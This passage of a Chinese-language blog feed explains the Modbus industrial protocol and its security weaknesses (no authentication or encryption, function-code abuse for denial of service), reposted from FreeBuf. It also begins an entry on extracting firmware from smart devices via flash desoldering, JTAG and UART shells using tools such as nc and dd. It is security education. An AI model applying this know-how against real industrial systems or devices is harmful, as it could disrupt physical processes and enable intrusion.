    <content type="html"><![CDATA[<h1 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h1><p><img src="\images\pasted-191.png" alt="upload successful"></p><h2 id="校验码"><a href="#校验码" class="headerlink" title="校验码"></a>校验码</h2><p>校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。<br>常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC……<br><img src="\images\pasted-189.png" alt="upload successful"><br><img src="\images\pasted-190.png" alt="upload successful"></p><h2 id="离散量输入"><a href="#离散量输入" class="headerlink" title="离散量输入"></a>离散量输入</h2><p>主要用来读取单个位的数据，如IO的状态；</p><h2 id="线圈"><a href="#线圈" class="headerlink" title="线圈"></a>线圈</h2><p>开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作；</p><h2 id="输入寄存器"><a href="#输入寄存器" class="headerlink" title="输入寄存器"></a>输入寄存器</h2><p>主要用来读取16位，也就是两个字节的数据；</p><h2 id="保持寄存器"><a href="#保持寄存器" class="headerlink" title="保持寄存器"></a>保持寄存器</h2><p>主要用来写入16位的数据。</p><h2 id="PLC"><a href="#PLC" class="headerlink" title="PLC"></a>PLC</h2><p>可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。</p><h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作.</p><h2 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h2><p>串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。<br>串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。<br>典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。串口通信最重要的参数是波特率、数据位、停止位和奇偶校验。对于两个进行通行的端口，这些参数必须匹配：   </p><h3 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p>这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。 </p><h3 id="数据位"><a href="#数据位" class="headerlink" title="数据位"></a>数据位</h3><p>这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。 </p><h3 id="停止位"><a href="#停止位" class="headerlink" title="停止位"></a>停止位</h3><p>用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。 </p><h3 id="奇偶校验位"><a href="#奇偶校验位" class="headerlink" title="奇偶校验位"></a>奇偶校验位</h3><p>在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。<br><img src="\images\pasted-188.png" alt="upload successful"><br><br><br></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。<br>通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。<br><img src="\images\pasted-181.png" alt="upload successful"><br><br><br></p><h1 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h1><p>Modbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图：<br><img src="\images\pasted-182.png" alt="upload successful"><br>一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。<br>其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1~255，其中128~255为保留值，用于异常消息应答报文。1~127为功能代码编号，其中65~72和100~110为用户自定义编码，具体请看下面这张图片：<br><br><br><br></p><h1 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h1><p>Modbus 协议是一种应用层报文传输协议，包括ASCII、ＲTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。<br>Modbus 协议使用串口传输时可以选择ＲTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LＲC校验，ＲTU模式采用16 位CＲC校验。通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。<br><br><br><br></p><h1 id="Modbus-RTU和Modbus-ASCII有什么区别？"><a href="#Modbus-RTU和Modbus-ASCII有什么区别？" class="headerlink" title="Modbus RTU和Modbus ASCII有什么区别？"></a>Modbus RTU和Modbus ASCII有什么区别？</h1><p>Modbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。  </p><h2 id="Modbus的工作原理"><a href="#Modbus的工作原理" class="headerlink" title="Modbus的工作原理"></a>Modbus的工作原理</h2><p>Modbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。<br>在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。<br>在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。<br>在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。<br><img src="\images\pasted-183.png" alt="upload successful"></p><h2 id="两种模式"><a href="#两种模式" class="headerlink" title="两种模式"></a>两种模式</h2><p><strong><em>在主从设备的通信中，可以使用ASCII模式或者RTU模式。</em></strong><br>在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0~9和A~F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。<br><img src="\images\pasted-184.png" alt="upload successful"><br>在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。<br>在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：<br>具体格式如图 所示。<br><img src="\images\pasted-185.png" alt="upload successful"></p><h2 id="MODBUS-ASCII和RTU两种模式的区别、优缺点"><a href="#MODBUS-ASCII和RTU两种模式的区别、优缺点" class="headerlink" title="MODBUS ASCII和RTU两种模式的区别、优缺点"></a>MODBUS ASCII和RTU两种模式的区别、优缺点</h2><p>下表是MODBUS ASCII协议和RTU协议的比较： </p><table><thead><tr><th>协议</th><th>开始标记</th><th>结束标记</th><th>校验</th><th>传输效率</th><th>程序处理</th></tr></thead><tbody><tr><td>ASCII</td><td>:（冒号）</td><td>CR,LF</td><td>LRC</td><td>低</td><td>直观，简单，易调试</td></tr><tr><td>RTU</td><td>无</td><td>无</td><td>CRC</td><td>高</td><td>稍复杂</td></tr></tbody></table><p>　　从上表的比较我们可以看到，MODBUS的ASCII协议和RTU协议相比，MODBUS ASCII协议拥有开始和结束标记，而MODBUS RTU却没有，所以ASCII协议的程序中对数据包的处理能更加方便。MODBUS ASCII协议的DATA域传输的都是可见的ASCII字符，因此在调试阶段就显得更加直观，另外它的LRC校验程序也比较容易编写，这些都是MODBUS ASCII的优点。MODBUS ASCII的主要缺点是传输效率低，因为它传输的都是可见的ASCII字符，原来用RTU传输的数据每一个字节，用ASCII的话都要把这个字节拆分两个字节，比如RTU传输一个十六进制数0xF9，ASCII就需要传输字符’F’和字符’9’，对应的ASCII码0x46和0x39两个字节，这样它的传输的效率肯定就比RTU低。所以一般来说，如果所需要传输的数据量较小可以考虑使用ASCII协议，如果所需传输的数据量比较大，最好能使用RTU协议。<br>　　另外，由于ASCII协议有开始标志和结束标志，所以一个数据包之间的各字节间的传输间隔时间可以大于1秒，而MODBUS RTU方式下，由于没有规定开始和结束标记，所以协议规定每两个字节之间发送或者接收的时间间隔不能超过3.5倍字符传输时间。如果两个字符时间间隔超过了3.5倍的字符传输时间，就认为一帧数据已经接收，新的一帧数据传输开始，所以RTU方式下两个字节间传输间隔有时间要求。MODBUS 的ASCII和RTU两种协议的这一区别可能决定某些应用场合只能选用其中一种协议。</p><p><br><br></p><h1 id="MODBUS-TCP注意点"><a href="#MODBUS-TCP注意点" class="headerlink" title="MODBUS TCP注意点"></a>MODBUS TCP注意点</h1><h2 id="主机和从机、服务端和客户端"><a href="#主机和从机、服务端和客户端" class="headerlink" title="主机和从机、服务端和客户端"></a>主机和从机、服务端和客户端</h2><h3 id="【在modbus协议中】"><a href="#【在modbus协议中】" class="headerlink" title="【在modbus协议中】"></a>【在modbus协议中】</h3><p>主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。</p><h3 id="【在网络应用中】"><a href="#【在网络应用中】" class="headerlink" title="【在网络应用中】"></a>【在网络应用中】</h3><p>在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。</p><h3 id="【在modbus-tcp中】"><a href="#【在modbus-tcp中】" class="headerlink" title="【在modbus tcp中】"></a>【在modbus tcp中】</h3><p>主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。</p><h2 id="是否可以多主机"><a href="#是否可以多主机" class="headerlink" title="是否可以多主机"></a>是否可以多主机</h2><p>通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。</p><h2 id="modbus-TCP协议简述"><a href="#modbus-TCP协议简述" class="headerlink" title="modbus TCP协议简述"></a>modbus TCP协议简述</h2><p>modbus TCP和modbus RTU基本相同，但是也存在一些区别<br>a.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代<br>b.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。<br>TCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如下图所示。<br><img src="\images\pasted-186.png" alt="upload successful"><br><strong><em>在modbus TCP中包含一个MBAP头，该头包含以下几个部分</em></strong></p><table><thead><tr><th>区域</th><th>长度</th><th>描述</th><th>客户端</th><th>服务器</th></tr></thead><tbody><tr><td>传输标志</td><td>2字节</td><td>MODBUS 请求和响应传输过程中序列号</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>协议标志</td><td>2字节</td><td>Modbus协议默认为0</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>长度</td><td>2字节</td><td>剩余部分的长度</td><td>客户端生成</td><td>应答时由服务器端生成</td></tr><tr><td>单元标志</td><td>1字节</td><td>从机标志（从机地址）</td><td>客户端生成</td><td>应答时复制该值</td></tr></tbody></table><ul><li>【注意】</li><li>【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机</li><li>【2】单元标志可理解为从机地址，此时已经不再重要</li></ul><h2 id="modbus-tcp-和-TCP-IP的关系"><a href="#modbus-tcp-和-TCP-IP的关系" class="headerlink" title="modbus tcp 和 TCP IP的关系"></a>modbus tcp 和 TCP IP的关系</h2><p>modbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。<br><br><br><br></p><h1 id="功能码作用"><a href="#功能码作用" class="headerlink" title="功能码作用"></a>功能码作用</h1><p>启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。<br>用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。<br>从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。<br>在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。  </p><h2 id="功能码的类型"><a href="#功能码的类型" class="headerlink" title="功能码的类型"></a>功能码的类型</h2><p>功能码主要分为有效功能码、异常功能码和错误功能码。<br>如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。<br>例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，<br>对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。</p><h2 id="有效功能码"><a href="#有效功能码" class="headerlink" title="有效功能码"></a>有效功能码</h2><p>有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点：</p><h2 id="控制数据四种型式"><a href="#控制数据四种型式" class="headerlink" title="控制数据四种型式"></a>控制数据四种型式</h2><p><strong><em>DI：DigitalInput</em></strong> （数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。<br><strong><em>DO：DigitalOutput</em></strong>（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。<br><strong><em>AI：Analog Input</em></strong>（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。<br><strong><em>AO：AnalogOutput</em></strong>（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。<br><img src="\images\pasted-187.png" alt="upload successful"><br><br><br></p><h1 id="Modbus-协议安全性分析"><a href="#Modbus-协议安全性分析" class="headerlink" title="Modbus 协议安全性分析"></a>Modbus 协议安全性分析</h1><p>Modbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。</p><h2 id="Modbus-协议的固有问题"><a href="#Modbus-协议的固有问题" class="headerlink" title="Modbus 协议的固有问题"></a>Modbus 协议的固有问题</h2><p>绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。  </p><h3 id="缺乏认证"><a href="#缺乏认证" class="headerlink" title="缺乏认证"></a>缺乏认证</h3><p>认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。</p><h3 id="缺乏授权"><a href="#缺乏授权" class="headerlink" title="缺乏授权"></a>缺乏授权</h3><p>授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。</p><h3 id="缺乏加密"><a href="#缺乏加密" class="headerlink" title="缺乏加密"></a>缺乏加密</h3><p>加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者<br>捕获和解析，为攻击者提供便利。</p><h3 id="功能码滥用"><a href="#功能码滥用" class="headerlink" title="功能码滥用"></a>功能码滥用</h3><p>功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。<strong><em>例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。</em></strong></p><h2 id="协议实现产生的问题"><a href="#协议实现产生的问题" class="headerlink" title="协议实现产生的问题"></a>协议实现产生的问题</h2><p>虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。</p><h3 id="设计安全问题"><a href="#设计安全问题" class="headerlink" title="设计安全问题"></a>设计安全问题</h3><p>Modbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。</p><h3 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h3><p>缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。</p><h3 id="Modbus-TCP-安全问题"><a href="#Modbus-TCP-安全问题" class="headerlink" title="Modbus TCP 安全问题"></a>Modbus TCP 安全问题</h3><p>目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。</p><h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><p>目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。</p><h3 id="从源头开始"><a href="#从源头开始" class="headerlink" title="从源头开始"></a>从源头开始</h3><p>工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。</p><h3 id="异常行为检测"><a href="#异常行为检测" class="headerlink" title="异常行为检测"></a>异常行为检测</h3><p>异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><p>Modbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。</p><h3 id="使用网络安全设备"><a href="#使用网络安全设备" class="headerlink" title="使用网络安全设备"></a>使用网络安全设备</h3><p>使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。<br><br><br><br><br>PS：本篇文章转载自<a href="http://www.freebuf.com/articles/ics-articles/148637.html" target="_blank" rel="noopener">FREEBUF</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;术语&quot;&gt;&lt;a href=&quot;#术语&quot; class=&quot;headerlink&quot; title=&quot;术语&quot;&gt;&lt;/a&gt;术语&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;\images\pasted-191.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
      <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
    
      <category term="modbus" scheme="http://yoururl.com/tags/modbus/"/>
    
      <category term="工控协议" scheme="http://yoururl.com/tags/%E5%B7%A5%E6%8E%A7%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>智能设备硬件安全测试</title>
    <link href="http://yoururl.com/2018/08/02/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoururl.com/2018/08/02/智能设备硬件安全测试/</id>
    <published>2018-08-02T15:24:00.000Z</published>
    <updated>2018-08-05T08:34:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智能设备的组成"><a href="#智能设备的组成" class="headerlink" title="智能设备的组成"></a>智能设备的组成</h1><ul><li>CPU: X86/ARM/MIPS/PPC等  </li><li>内存: SDRAM/RAM  </li><li>存储: Flash/TF卡/SD卡/MMC卡/硬盘  </li><li>串口: 一般电路板会留，做调试用网口: 智能设备联网  </li><li>USB口: 接U盘做扩展存储用、也可接键盘和鼠标等  </li><li>无线接口: Wifi/蓝牙/ZigeBee等  </li><li>bootLoader: Uboot等  </li><li>操作系统: Linux/RT-Linux/VxWorks/uCOS-I<br><br><br><br></li></ul><h1 id="智能硬件设备测试简要流程"><a href="#智能硬件设备测试简要流程" class="headerlink" title="智能硬件设备测试简要流程"></a>智能硬件设备测试简要流程</h1><p>1、获取固件<br>2、逆向固件<br>3、分析固件漏洞/调试固件/Fuzz漏洞<br>4、漏洞验证(这一步要有硬件)<br>5、完成测试文档<br><br><br><br></p><h1 id="智能设备固件获取方法"><a href="#智能设备固件获取方法" class="headerlink" title="智能设备固件获取方法"></a>智能设备固件获取方法</h1><p>1、官网或联系售后索取升级包<br>2、在线升级, 抓包获取下载地址<br>3、逆向升级软件,软件内置解包和通讯算法<br>4、从硬件调试接口:JTAG/SWD, 利用调试工具的任意地址读取功能<br>5、拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件<br>6、用硬件电路的调试串口和固件的bootloader获取固件<br>7、通过利用网页和通讯漏洞获取固件敏感信息<br>8、用逻辑分析仪监听flash,ram获取信息<br>9、从串口进入系统后,用tar、nc、dd、echo、vi等命令提取<br><img src="\images\pasted-174.png" alt="upload successful"><br><br><br></p><h2 id="拆Flash后-用编程器获取固件"><a href="#拆Flash后-用编程器获取固件" class="headerlink" title="拆Flash后,用编程器获取固件"></a>拆Flash后,用编程器获取固件</h2><p>只需要三步, 但对大部分人很困难:<br>(1)焊下flash芯片<br>(2)用编程器提取固件内容<br>(3)把FLASH芯片焊回电路板<br><img src="\images\pasted-175.png" alt="upload successful"><br><img src="\images\pasted-176.png" alt="upload successful"><br><br><br></p><h2 id="从串口-UART-调试口获取固件"><a href="#从串口-UART-调试口获取固件" class="headerlink" title="从串口(UART)调试口获取固件"></a>从串口(UART)调试口获取固件</h2><ul><li>前提: 开发板上有串口调试接，需要我们找出隐藏的串口。  </li><li>串口按照电压有两种标准：RS232标准和TTL标准</li><li>RS232标准： 电压范围：-12V，+12V （负逻辑）</li><li>TTL标准： 电压范围：0，5V</li><li>串口引脚识别方法: 串口一般有4个引脚</li><li>VCC：电源电压为3.3V 或 5V</li><li>GND：电源电压地</li><li>RXD：数据接收引脚，万用表测电压为低（如硬件上拉可为高）</li><li>TXD：数据发送引脚，万用表测电压一般为高</li><li>试验: 用万用表找串口<br><br><br></li></ul><h2 id="从串口进入系统"><a href="#从串口进入系统" class="headerlink" title="从串口进入系统"></a>从串口进入系统</h2><ul><li>SecureCRT的使用</li><li>通过开发留下的串口, 进入系统</li><li>尝试运行系统的调试命令</li><li>学习串口日志的记录和回看方法<br><br><br></li></ul><h2 id="从串口uboot提取固件流程"><a href="#从串口uboot提取固件流程" class="headerlink" 